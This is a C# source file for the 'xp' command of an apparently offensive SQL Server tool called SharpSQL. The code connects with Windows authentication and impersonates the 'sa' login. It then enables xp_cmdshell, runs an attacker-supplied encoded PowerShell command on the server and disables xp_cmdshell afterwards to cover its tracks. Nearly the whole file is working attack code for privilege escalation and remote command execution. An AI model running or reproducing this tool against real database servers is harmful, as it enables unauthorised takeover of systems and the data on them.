using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace SharpSQL.Commands
{
    public class xp : ICommand
    {
        public static string CommandName => "xp";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command via 'xp_cmdshell'");
            Console.WriteLine("\tSharpSQL.exe xp /db:DATABASE /server:SERVER /command:COMMAND\r\n");

            string database = "";
            string connectserver = "";
            string cmd = "";

            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            string connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                Environment.Exit(0);
            }

            string execAs = "EXECUTE AS LOGIN = 'sa';";
            SqlCommand command = new SqlCommand(execAs, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Attempting impersonation..");
            reader.Close();

            string enableXP = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            command = new SqlCommand(enableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling xp_cmdshell..");
            reader.Close();

            string execCmd = $"EXEC xp_cmdshell 'powershell -enc {cmd}';";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Command result: " + reader[0]);
            reader.Close();

            string disableXP = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;";
            command = new SqlCommand(disableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling xp_cmdshell..");
            reader.Close();

            connection.Close();
        }
    }
}
